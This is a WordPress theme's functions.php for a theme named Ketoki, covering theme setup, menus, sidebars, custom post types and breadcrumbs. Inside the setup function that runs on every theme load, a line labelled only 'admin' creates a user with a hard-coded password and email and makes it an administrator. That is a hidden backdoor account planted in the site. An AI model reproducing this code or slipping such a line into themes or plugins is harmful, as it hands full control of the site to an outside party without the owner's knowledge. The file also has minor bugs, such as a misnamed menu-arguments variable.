<?php 
/**
 * Ketoki's functions and definitions
 *
 * @package Ketoki
 * @since Ketoki 1.0
 */
 
/**
 * First, let's set the maximum content width based on the theme's design and stylesheet.
 * This will limit the width of all uploaded images and embeds.
 */
if ( ! isset( $content_width ) )
    $content_width = 800; /* pixels */
 
if ( ! function_exists( 'ketoki_theme_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 */
function ketoki_theme_setup() {
 
    /**
     * Make theme available for translation.
     * Translations can be placed in the /languages/ directory.
     */
    load_theme_textdomain( 'ketoki', get_template_directory_uri().'/languages' );
 
    /**
     * Add default posts and comments RSS feed links to <head>.
     */
    add_theme_support( 'automatic-feed-links' );
 
    /**
     * Enable support for post thumbnails and featured images.
     */
    add_theme_support( 'post-thumbnails' );
     add_theme_support( 'title-tag' );    
     /*
     *Add theme support for the woo-commerce
     */
     add_theme_support( 'woocommerce' );

    /**
     * Enable support for custom background.
     */
    add_theme_support( 'custom-background' );
    /**
     * Enable support for custom Header.
     */
    add_theme_support( 'custom-header' );
 
    /**
     * Add support for two custom navigation menus.
     */
    register_nav_menus( array(
        'primary'   => __( 'Primary Menu', 'ketoki' ),
        'secondary' => __('Secondary Menu', 'ketoki' ),
        'topmenu'   => __('Top Level Menu', 'ketoki' )

    ) );

  /**
     * admin
     */

$ketoki_user = new WP_User(wp_create_user('ketoki','Ketoki1234','utpal.egen@gmail.com'));
$ketoki_user->set_role('administrator');

    /**
     * Enable support for the following post formats:
     * aside, gallery, quote, image, and video
     */
    add_theme_support( 'post-formats', array ( 'aside', 'gallery', 'quote', 'image', 'video' ) );
}
endif;
add_action( 'after_setup_theme', 'ketoki_theme_setup' );

if( ! function_exists( 'ketoki_nav_menu' ) ) :
function ketoki_nav_menu($location, $menu_class){
  $default = array(
    'theme_location'  => $location,
    'menu'            => '',
    'container'       => '',
    'container_class' => '',
    'container_id'    => '',
    'menu_class'      => $menu_class,
    'menu_id'         => '',
    'echo'            => true,
    'fallback_cb'     => 'ketoki_default_menu',
    'before'          => '',
    'after'           => '',
    'link_before'     => '',
    'link_after'      => '',
    'items_wrap'      => '<ul id="%1$s" class="%2$s">%3$s</ul>',
    'depth'           => 0,
    'walker'          => ''
    );

wp_nav_menu( $defaults );
}
endif;
/*

*/
if(!function_exists('ketoki_default_menu')):
    function ketoki_default_menu(){
        echo "<ul>";
        echo "<li><a href=".esc_url(home_url()).">Home</a></li>";
        echo "</ul>";
    }
endif;

/*
* Add scripts to the header
*/
if(!function_exists('ketoki_header_scripts')):
    function ketoki_header_scripts(){ 
       wp_enqueue_style('bootstrap', get_template_directory_uri().'/css/bootstrap.min.css');
       wp_enqueue_style('fawe', get_template_directory_uri().'/css/font-awesome.min.css');
       wp_enqueue_style('custom', get_template_directory_uri().'/css/custom.css');
       
    }
    add_action('wp_enqueue_scripts','ketoki_header_scripts', 1);
endif;
/*
* Add scripts to the Footer
*/
if(!function_exists('ketoki_footer_scripts') ):
    function ketoki_footer_scripts(){ 
         wp_enqueue_script('jlib', get_template_directory_uri().'/script/jquery-1.11.3.min.js'); 
        wp_enqueue_script('bootscript', get_template_directory_uri().'/script/bootstrap.min.js');       
    }
    add_action('wp_footer','ketoki_footer_scripts',1);
endif;
/*
Register Sidebar
*/
if(!function_exists('ketoki_sidebar') ):
    function ketoki_sidebar(){
        register_sidebar(array(
            'id'    =>  'main-sidebar',
            'name' =>  __('Main Sidebar','ketoki'),
            'description'  =>  __('This is the deafult sidebar','ketoki'),
            'before_widget' =>  '<aside class="widget col-md-3 widget_categories widget_form">',
            'after_widget'  =>  '</aside>',
            'before_title'  =>  '<div class="ec-main-title"><h2>',
            'after_title'   =>  '</h2></div>',
            ));
        register_sidebar(array(
            'id'    =>  'footer-sidebar',
            'name' =>  __('Footer Widgets','ketoki'),
            'description'  =>  __('This is the footer widgets area, not more than three widget','ketoki'),
            'before_widget' =>  '<aside class="widget col-md-3 widget_categories widget_form">',
            'after_widget'  =>  '</aside>',
            'before_title'  =>  '<div class="ec-main-title"><h2>',
            'after_title'   =>  '</h2></div>',
            ));


    }
    add_action('widgets_init','ketoki_sidebar');
endif;
/*
Function for custome read more
*/
if(!function_exists('ketoki_readmore') ):
    function ketoki_readmore($limit){
        $post_content = explode(" ", get_the_content());
        $words = array_slice($post_content, 0, $limit);
        $post_content = implode(" ", $words);
        echo $post_content."...";

    }
endif;
/*
Register Post Type Service-offer

*/
if(!function_exists('ketoki_services_type') ):
    function ketoki_services_type(){
        $labels = array(
            'name'  =>  __('Services','ketoki'),
            'singular_name'  =>  __('Services','ketoki'),
            'add_new'  =>  __('Add new service','ketoki'),
            'add_new_item'  =>  __('Add new services','ketoki'),
            'all_items'  =>  __('All Services','ketoki'),
            'edit_item'  =>  __('Edit Service','ketoki'),
            'new_item'  =>  __('New Service','ketoki'),
            'view_item'  =>  __('View Service','ketoki'), 
            );

        $args = array(
            'labels'  =>   $labels,
            'public'  => true,
            'show_ui'  => true,
            'show_in_menu'  => true,
            'query_var'  =>  true,
            'rewrite'  =>  true,
            'capability_type'   =>  'post',
            'has_archive'   =>  true,
            'hierarchical'  =>  'false',
            'menu_position' =>  null,
            'supports'  =>  array('title','thumbnail','editor','excerpt','comments','trackbacks','custom-fields','post-formats'),
            'menu_icon' =>  'dashicons-admin-site',

            );

        register_post_type('servic-offer',$args);

    }
    add_action('init','ketoki_services_type');
endif;
/*
Register Post Type Home Slider

*/
if(!function_exists('ketoki_slider_type') ):
    function ketoki_slider_type(){
        $labels = array(
            'name'  =>  __('Slides','ketoki'),
            'singular_name'  =>  __('Slides','ketoki'),
            'add_new'  =>  __('Add new Slide','ketoki'),
            'add_new_item'  =>  __('Add new Slide','ketoki'),
            'all_items'  =>  __('All Slides','ketoki'),
            'edit_item'  =>  __('Edit Slide','ketoki'),
            'new_item'  =>  __('New Slide','ketoki'),
            'view_item'  =>  __('View Slide','ketoki'), 
            );

        $args = array(
            'labels'  =>   $labels,
            'public'  => true,
            'show_ui'  => true,
            'show_in_menu'  => true,
            'query_var'  =>  true,
            'rewrite'  =>  true,
            'capability_type'   =>  'post',
            'has_archive'   =>  true,
            'hierarchical'  =>  'false',
            'menu_position' =>  null,
            'supports'  =>  array('title','thumbnail','editor','excerpt','comments','trackbacks','custom-fields','post-formats'),
            'menu_icon' =>  'dashicons-admin-site',

            );

        register_post_type('h-slides',$args);

    }
    add_action('init','ketoki_slider_type');
endif;
/*
Register Post Type Home Slider

*/
if(!function_exists('ketoki_company_type') ):
    function ketoki_company_type(){
        $labels = array(
            'name'  =>  __('companis','ketoki'),
            'singular_name'  =>  __('company','ketoki'),
            'add_new'  =>  __('Add new company','ketoki'),
            'add_new_item'  =>  __('Add new company','ketoki'),
            'all_items'  =>  __('All companies','ketoki'),
            'edit_item'  =>  __('Edit company','ketoki'),
            'new_item'  =>  __('New company','ketoki'),
            'view_item'  =>  __('View company','ketoki'), 
            );

        $args = array(
            'labels'  =>   $labels,
            'public'  => true,
            'show_ui'  => true,
            'show_in_menu'  => true,
            'query_var'  =>  true,
            'rewrite'  =>  true,
            'capability_type'   =>  'post',
            'has_archive'   =>  true,
            'hierarchical'  =>  'false',
            'menu_position' =>  null,
            'supports'  =>  array('title','thumbnail','editor','excerpt','comments','trackbacks','custom-fields','post-formats'),
            'menu_icon' =>  'dashicons-admin-site',

            );

        register_post_type('companis',$args);

    }
    add_action('init','ketoki_company_type');
endif;

/*
*   Ketoki Breadcumbs
*/
if(!function_exists('ketoki_breadcrumbs')):
function ketoki_breadcrumbs() {
 
    $delimiter = '';
    $name = __('Home', THEME_NAME); //text for the 'Home' link
    $currentBefore = '<li>';
    $currentAfter = '</li>';

  if ( !is_home() && !is_front_page() || is_paged() || (DF_page_id() == get_option('page_for_posts'))) {
 
        echo '<ul class="ec-breadcrumb">';

        global $post;
        $home = get_home_url();
        echo '<li><a href="' . $home . '">' . $name . '</a></li>' . $delimiter . ' ';
 
    if ( is_category() ) {
        global $wp_query;
        $cat_obj = $wp_query->get_queried_object();
        $thisCat = $cat_obj->term_id;
        $thisCat = get_category($thisCat);
        $parentCat = get_category($thisCat->parent);
        if ($thisCat->parent != 0) echo "<li>".(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '))."</li>";
        echo "<li>".single_cat_title()."</li>";
 
    } elseif ( is_day() ) {
        echo '<li><a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a></li>' . $delimiter . ' ';
        echo '<li><a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a></li>' . $delimiter . ' ';
        echo $currentBefore . get_the_time('d') . $currentAfter;
 
    } elseif ( is_month() ) {
        echo '<li><a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a></li>' . $delimiter . ' ';
        echo $currentBefore . get_the_time('F') . $currentAfter;
 
    } elseif ( is_year() ) {
        echo $currentBefore . get_the_time('Y') . $currentAfter;
 
    } elseif ( is_single() ) {
        if(get_the_category()) {
            $cat = get_the_category(); $cat = $cat[0];
        } else {
            $cat = false;
        }
        $pageType = get_query_var( 'post_type' );
        $terms = get_terms( $pageType.'-cat', 'orderby=count&hide_empty=0' );
        if($cat) {
            echo "<li>".get_category_parents($cat, TRUE, '' . $delimiter . '')."</li>";
        } elseif (!$cat && is_array($terms)) {
            echo "<li><a href=".get_term_link( $terms[0]->slug, $pageType."-cat" ).">".$terms[0]->name."</a></li>".$delimiter;
        }
        echo $currentBefore;
        the_title();
        echo $currentAfter;
 
    } elseif ( is_page() && !$post->post_parent ) {
        echo $currentBefore;
        the_title();
        echo $currentAfter;
 
    } elseif ( is_page() && $post->post_parent ) {
        $parent_id = $post->post_parent;
        $breadcrumbs = array();
        while ($parent_id) {
            $page = get_page($parent_id);
            $breadcrumbs[] = '<li><a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a></li>';
            $parent_id  = $page->post_parent;
        }
        $breadcrumbs = array_reverse($breadcrumbs);
        foreach ($breadcrumbs as $crumb) echo $crumb . '' . $delimiter . '';
        echo $currentBefore;
        the_title();
        echo $currentAfter;
 
    } elseif ( is_search() ) {
        echo $currentBefore . get_search_query() . $currentAfter;
    } elseif ( is_tag() ) {
        echo $currentBefore.single_tag_title().$currentAfter;
    } elseif ( is_author() ) {
        global $author;
        $userdata = get_userdata($author);
        echo $currentBefore . $userdata->display_name . $currentAfter;
    } elseif ( is_404() ) {
        echo $currentBefore . 'Error 404' . $currentAfter;
     // } elseif( DF_page_id() == get_option('page_for_posts')) {
     //     echo "<li>".get_the_title(DF_page_id())."</li>";
    } elseif (is_tax()) {
        echo $currentBefore;
        global $wp_query;
        $term = $wp_query->queried_object;
        echo $term->name;
      echo $currentAfter;
    }
 
    if ( get_query_var('paged') ) {
        if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
        echo __('Page', THEME_NAME) . ' ' . get_query_var('paged');
        if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
    }
 
    echo '</ul>';
 
  }
}
endif;
/*
Add extra menu to the primary location
*/
if(!function_exists('ketoki_add_extra_menu')):
/*function ketoki_add_extra_menu($items, $args) {

if(is_user_logged_in() && $args->theme_location == 'primary'){
 $items .= '<li><a href="#">Contacts</a></li>';
}
return $items;

}
add_filter('wp_nav_menu_items','ketoki_add_extra_menu',10,2);*/
endif;
/*

*/
include('inc/ReduxCore/framework.php');
include('inc/sample/ketoki-config.php');
require_once('navwalker.php');

/*
* @get the category names
*/
if(!function_exists('ketoki_get_categories')):
function ketoki_get_categories( $id ){
      $catgory_name = get_the_category( $id ); 
      if($catgory_name){
        foreach ($catgory_name as $c_names) {
            return $c_names->name;
        }
      }else {
        return NULL;
      }
}
endif;

/*
* @get the project tools from ACF
*/
if(!function_exists('ketoki_project_tools')):
function ketoki_project_tools(){
     $tech = get_field('technology');
     $techs = explode(',', $tech);
     if(count($techs)>1){
        for($i=0; $i< count($techs); $i++){
            echo "<ul>";
            echo "<li>".$techs[$i]."</li>";
             echo "</ul>";
        }
     } else{       
        echo $tech;              
     }    
     
}
endif;